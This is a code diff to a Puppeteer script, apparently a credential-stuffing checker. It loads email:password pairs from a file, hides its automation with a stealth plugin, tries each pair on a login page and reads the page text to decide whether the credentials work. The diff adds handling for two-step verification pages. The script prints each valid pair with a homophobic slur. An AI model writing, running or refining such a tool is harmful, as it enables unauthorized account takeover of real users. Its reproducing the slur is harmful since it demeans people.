@@ -1,6 +1,6 @@
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-const values = ['Wrong', "changed", "find", "Step", "email", "Check", "check", "2", "sent", "valid", "locked", "Type", "Open", "verify", "Verify"];
+const values = ['Wrong', '2-Step', 'keep', 'Verification', "changed", "find", "Step", "email", "Check", "check", "2", "sent", "valid", "locked", "Type", "Open", "verify", "Verify"];
 puppeteer.use(StealthPlugin());
 var JFile = require('jfile');
 require('dotenv').config()
@@ -94,14 +94,18 @@ function checkUpper(string) {
         return strings.filter(string => text.includes(string));
       }, values);
 
+      if(matches.includes("2-Step")) {
+        await page.goto(loginUrl, { waitUntil: 'networkidle2' });
+        continue;
+      }
 
       //If password valid
-      if (matches.includes("Verify") || matches.includes("verify")) {
+      if (matches.includes("verify") || matches.includes("keep")) {
         console.log(1 + i + ": Sorry, You're Gay : " + myF.lines[i].split(":")[0] + " : " + (checkUpper(myF.lines[i].split(":")[1]) ? myF.lines[i].split(":")[1].charAt(0).toLowerCase() + myF.lines[i].split(":")[1].substring(1): myF.lines[i].split(":")[1].charAt(0).toUpperCase() + myF.lines[i].split(":")[1].substring(1)))
       }
 
-      //Route back to login page and proceed with next credential
       await page.goto(loginUrl, { waitUntil: 'networkidle2' });
+      continue
 
     } catch (error) {
 
